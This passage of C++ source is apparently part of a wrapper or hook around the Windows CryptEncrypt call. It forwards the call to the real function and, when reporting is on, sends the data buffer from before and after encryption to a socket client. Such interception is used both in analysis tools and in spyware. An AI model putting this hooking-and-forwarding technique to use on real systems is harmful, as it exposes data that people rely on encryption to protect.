      memcpy(end, pdwDataLen, 4);
      end += 4;
      memcpy(end, pbData, *pdwDataLen);
      end += *pdwDataLen;
    }
    else
    {
      memcpy(end, &zero, 4);
      end += 4;
    }
  }
  
	if (hModule != NULL) {
		cE = reinterpret_cast<cryptEncrypt>(::GetProcAddress(hModule, "CryptEncrypt"));
	}
	if (cE != NULL) {
		ret = (*cE)(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);
	}

	if (hModule != NULL){
		::FreeLibrary(hModule);
	}
	if (!ret){
		//MessageBoxA(NULL, "Error, cryptencrypt returned false!", "Error", MB_OK);
	}
	
	if(report)
  {
    if(ret && *pdwDataLen < MAX_PACKET / 3 && *pdwDataLen > 0)
    {
      memcpy(end, pdwDataLen, 4);
      end += 4;
      memcpy(end, pbData, *pdwDataLen);
      end += *pdwDataLen;
    }
    else
    {
      memcpy(end, &zero, 4);
      end += 4;
    }
    
    send(client, buffer, end - buffer, 0);
  }
	
	return ret;
}
